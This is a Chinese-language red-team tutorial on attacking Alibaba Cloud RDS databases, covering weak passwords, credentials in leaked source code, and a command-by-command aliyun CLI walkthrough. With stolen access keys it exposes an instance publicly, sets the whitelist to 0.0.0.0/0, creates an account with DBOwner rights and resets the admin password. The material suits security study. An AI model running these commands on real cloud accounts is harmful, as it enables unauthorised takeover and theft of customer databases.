---
title: 阿里云 RDS 云数据库攻防
id: aliyun_rds
---

# 一、RDS存在的风险

## 1、弱口令

其实在设置密码的时候可以发现，设置的密码是强制大写加小写字母与数字的，如果这样组合，其实不一定存在弱口令，但是试了一下Qwe123123这种密码，发现居然可以，那么就可以确定，至少存在键盘弱口令的。

![image-20220401120528194](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401120528194.png)

虽然实战中遇到的几率很小，但是至少也是一个问题

## 2、源码泄露

![image-20220401115956407](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401115956407.png)

这个在实战中碰到的次数比较多，不过大部分都有一些局限的情况

1、服务部署在VPC内网，没有申请公网访问地址，所以无法通过公网连接，只能在VPC中通过内网地址连接

2、白名单的问题，如果想公网通过地址连接需要满足两个条件

- 1、申请了公网地址，并且泄露
- 2、白名单设置为0.0.0.0/0

![image-20220401122852048](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401122852048.png)

不过在一次红蓝中，通过公网的GIT泄露发现了泄露的源码，也就是上图，RDS和内网IP的数据库都无法连接，不过在打进云上内网后，通过frp，使用这些地址是可以连接的

![image-20220401121215753](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401121215753.png)

## 3、密钥泄露如何进行利用

### 3.1、获取所有DB实例

```bash
aliyun rds DescribeDBInstances
```

![image-20220401144309898](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401144309898.png)

此时会列出所有的RDS信息，可以看到所在的地区，连接的地址，版本，服务类型，我们注意到有一个DBInstanceID，然后我们可以使用以下命令获取指定实例ID下更详细的信息

```bash
 aliyun rds DescribeDBInstanceAttribute --DBInstanceId xxxx
```

![image-20220401144755824](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401144755824.png)

这里可以看到实例的安全组等

### 3.2、申请公网访问地址

##### 查看是否存在公网访问地址

```bash
aliyun rds DescribeDBInstanceNetInfo --DBInstanceId xxx
```

![image-20220401145646520](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401145646520.png)

在这里我们可以看到RDS的访问地址，如果不存在公网访问地址的话，我们可以申请一个

> 下图就是没有公网地址的返回结果

![image-20220401145920493](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401145920493.png)

那么我们尝试申请一个

##### 申请公网访问地址

```bash
aliyun rds AllocateInstancePublicConnection --DBInstanceId xxxx --Port 1433 --ConnectionStringPrefix uzjuse
```

![image-20220401150126571](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401150126571.png)

可以看到我们申请了一个公网地址，尝试访问试试

![image-20220401150350698](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401150350698.png)

![image-20220401150456486](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401150456486.png)

此时我们还无法访问，所以要添加白名单

### 3.3、添加白名单

#### 查询指定RDS白名单

```bash
aliyun rds DescribeDBInstanceIPArrayList --DBInstanceId xxx
```

在添加白名单之前，我们首先要先查看一下白名单，在下图中可以看到，白名单显示，只允许127.0.0.1访问，下面一条是阿里云的默认安全组，用来做备份用的

![image-20220401150639629](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401150639629.png)

#### 为指定实例添加白名单

```bash
 aliyun rds ModifySecurityIps --DBInstanceId xxxxx --SecurityIps 0.0.0.0/0
```

![image-20220401151003122](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151003122.png)

![image-20220401151051605](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151051605.png)

### 3.4、创建账号

我们可以通过以下命令查询当前RDS中有哪些用户

```bash
aliyun rds DescribeAccounts --DBInstanceId xxx
```

![image-20220401151936422](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151936422.png)

```bash
aliyun rds CreateAccount --AccountName UzJuSecTest --AccountPassword Qwe123123 --DBInstanceId xxxx
```

![image-20220401151450854](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151450854.png)

![image-20220401151527721](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151527721.png)

那么如果这个时候，我们连接上去，看到一个数据库，没有权限怎么办？

![image-20220401151748905](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401151748905.png)

### 3.5、为账号添加数据库权限

#### 查询数据库有哪些

```bash
aliyun rds DescribeDatabases --DBInstanceId xxx
```

在为自己添加权限之前，我们需要知道，我们想看哪个数据库，或者从上面NaviCat的链接信息中也可以看到

![image-20220401152117237](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152117237.png)

#### 为自己添加uzju数据库的权限

```bash
aliyun rds GrantAccountPrivilege --AccountName UzJuSecTest --AccountPrivilege DBOwner --DBName uzju --DBInstanceId xxx
```

![image-20220401152409113](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152409113.png)

![image-20220401152514495](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152514495.png)

现在我们已经拥有了这个数据库的操作权限

### 3.6、直接修改高权限账号的密码

那么既然我们上面的步骤很繁琐，可不可以直接修改管理员的密码呢，答案是可以的，不过在真实环境中，修改管理员密码有可能会对业务造成不可挽回的后果

```bash
aliyun rds ResetAccountPassword --AccountName uzju --AccountPassword Qwe123123 --DBInstanceId 
```

![image-20220401152746592](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152746592.png)

在之前我们已经知道了Super账号的用户名，那么我们将密码修改为Qwe123123，随后尝试连接

![image-20220401152842812](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152842812.png)

![image-20220401152848201](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152848201.png)

![image-20220401152935833](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220401152935833.png)

# 二、总结

RDS的攻击面基本都来自于用户侧配置问题，并且很多RDS都不会放在公网，而是在VPC的内网中，那么我们如果在公网中找到一个泄露了RDS账号与密码，可以保留起来，打进内网的时候也许能派上用场，并且在AK泄露的时候，我们也是需要拥有一定的权限，才可以做这些操作

遇到AK泄露，常规的利用方法无非就是三种

1、手动去调API（费时费力，属于盲猜的一种形式）

2、用行云管家这种工具

3、自己写工具，体力活，堆API
